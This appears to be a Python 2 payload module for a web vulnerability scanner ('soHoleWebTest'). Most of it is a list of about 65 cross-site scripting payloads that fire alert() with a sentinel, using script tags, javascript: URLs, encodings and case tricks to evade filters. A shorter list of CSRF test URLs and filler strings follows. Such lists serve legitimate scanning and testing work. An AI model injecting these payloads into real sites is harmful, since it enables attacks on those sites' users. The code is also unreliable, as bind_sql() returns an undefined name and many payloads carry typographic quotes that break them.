#-*- coding:utf-8 -*-
#!/usr/bin/python

sentinelvalue = "soHoleWebTest"
class data():
	@staticmethod
	def sentinelvalue():
		return "soHoleWebTest"
	@staticmethod
	def xss():
		retList = [
		'''</soHoleWebTest>''',
		'''><script>alert('soHoleWebTest')</script>''',
		'''=’><script>alert('soHoleWebTest')</script> ''',
		'''<script>alert(''soHoleWebTest")</script>''',  
		'''<script>alert(soHoleWebTest)</script>''' , 
		'''%3Cscript%3Ealert(’soHoleWebTest’)%3C/script%3E''' , 
		'''<s&#99;ript>alert(’soHoleWebTest’)</script>'''  ,
		'''<img src="javas&#99;ript:alert(’soHoleWebTest’)">''',  
		'''%0a%0a<script>alert(\"soHoleWebTest\")</script>.jsp''' , 
		'''%22%3cscript%3ealert(%22soHoleWebTest%22)%3c/script%3e''',  
		'''%3c/a%3e%3cscript%3ealert(%22soHoleWebTest%22)%3c/script%3e''' , 
		'''%3c/title%3e%3cscript%3ealert(%22soHoleWebTest%22)%3c/script%3e''',  
		'''&lt;script&gt;alert(’soHoleWebTest’);&lt;/script&gt''' , 
		'''<script>alert(’soHoleWebTest’)</script>''',  
		'''"><script>alert(’soHoleWebTest’)</script>''', 
		'''%22%3E%3Cscript%3Ealert(soHoleWebTest)%3C/script%3E''',  
		'''%3Cscript%3Ealert(soHoleWebTest);%3C/script%3E&''',  
		'''%3Cscript%3Ealert(soHoleWebTest);%3C/script%3E&SESSION_ID={SESSION_ID}&SESSION_ID=''',  
		'''<IMG SRC="javascript:alert(’soHoleWebTest’);">''',  
		'''<IMG SRC=javascript:alert(’soHoleWebTest’)>''',  
		'''<IMG SRC=JaVaScRiPt:alert(’soHoleWebTest’)>''',  
		'''<IMG SRC=JaVaScRiPt:alert(&quot;soHoleWebTest&quot;)>''',  
		'''<IMG SRC="jav&#x09;ascript:alert(’soHoleWebTest’);">''',  
		'''<IMG SRC="jav&#x0A;ascript:alert(’soHoleWebTest’);">''',  
		'''<IMG SRC="jav&#x0D;ascript:alert(’soHoleWebTest’);">''',  
		'''<IMG SRC=" javascript:alert(’soHoleWebTest’);">''',  
		'''<SCRIPT>a=/soHoleWebTest/alert(a.source)</SCRIPT>''',  
		'''<BODY BACKGROUND="javascript:alert(’soHoleWebTest’)">''',  
		'''<BODY ONLOAD=alert(’soHoleWebTest’)>''',  
		'''<IMG DYNSRC="javascript:alert(’soHoleWebTest’)">''',  
		'''<IMG LOWSRC="javascript:alert(’soHoleWebTest’)">''',  
		'''<BGSOUND SRC="javascript:alert(’soHoleWebTest’);">''',  
		'''<br size="&{alert(’soHoleWebTest’)}">''',  
		'''<LINK REL="stylesheet" HREF="javascript:alert(’soHoleWebTest’);">''',  
		'''<IMG SRC=’vbscript:msgbox("soHoleWebTest")’>''', 
		'''<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(’soHoleWebTest’);">''',  
		'''<IFRAME SRC=javascript:alert(’soHoleWebTest’)></IFRAME>''',  
		'''<FRAMESET><FRAME SRC=javascript:alert(’soHoleWebTest’)></FRAME></FRAMESET>''',  
		'''<TABLE BACKGROUND="javascript:alert(’soHoleWebTest’)">''',  
		'''<DIV STYLE="background-image: url(javascript:alert(’soHoleWebTest’))">''',  
		'''<DIV STYLE="width: expression(alert(’soHoleWebTest’));">''',  
		'''<IMG STYLE=’xss:expre\ssion(alert("soHoleWebTest"))’>''',
		'''<STYLE TYPE="text/javascript">alert(’soHoleWebTest’);</STYLE>''',  
		'''<STYLE TYPE="text/css">.XSS{background-image:url("javascript:alert(’soHoleWebTest’)");}</STYLE><A CLASS=XSS></A>''',  
		'''<STYLE type="text/css">BODY{background:url("javascript:alert(’soHoleWebTest’)")}</STYLE>''',  
		'''<BASE HREF="javascript:alert(’soHoleWebTest’);//">''',  
		'''getURL("javascript:alert(’soHoleWebTest’)")''',  
		'''a="get";b="URL";c="javascript:";d="alert(’soHoleWebTest’);";eval(a+b+c+d);''',  
		'''<XML SRC="javascript:alert(’soHoleWebTest’);">''',
		'''"> <BODY ONLOAD="a();"><SCRIPT>function a(){alert(’soHoleWebTest’);}</SCRIPT><"''',  
		'''<IMG SRC="javascript:alert(’soHoleWebTest’)"''',  
		'''>"><script>alert("soHoleWebTest")</script>&''',
		'''"><STYLE>@import"javascript:alert(soHoleWebTest)";</STYLE>''',
		'''alert(%26quot;%26%23x20;soHoleWebTest%26%23x20;Test%26%23x20;Successful%26quot;)>''',
		'''>%22%27><img%20src%3d%22javascript:alert(%27%20soHoleWebTest%27)%22>''',
		'''%uff1cscript%uff1ealert(soHoleWebTest)%uff1c/script%uff1e''',
		'''<IMG SRC="javascript:alert(soHoleWebTest);">''',
		'''<IMG SRC=javascript:alert(soHoleWebTest)>''',
		'''<IMG SRC=JaVaScRiPt:alert(soHoleWebTest)>''',
		'''<IMG SRC=JaVaScRiPt:alert(&quot;soHoleWebTest<WBR>&quot;)>''',
		'''<IMG SRC="jav&#x09;ascript:alert(<WBR>soHoleWebTest);">''',
		'''<IMG SRC="jav&#x0A;ascript:alert(<WBR>soHoleWebTest);">''',
		'''<IMG SRC="jav&#x0D;ascript:alert(<WBR>soHoleWebTest);">'''
		]
		return retList
	@staticmethod
	def bind_sql():
		retLest = []
		return retList

	@staticmethod
	def csrf():
		retList = [
		'''http://www.baidu.com/''',
		'''http://www.google.com/''',
		'''http://127.0.0.1/test.asp''',
		'''http://www.testtesttesttest.cn/testtest.php''',
		'''https://126.com/''',
		'''xss:hello''',
		'''csrf:hello''',
		'''soHole:hi''',
		"A" * 128,
		"B" * 256,
		]
		return retList

if __name__ == '__main__':
	print len(data.xss())
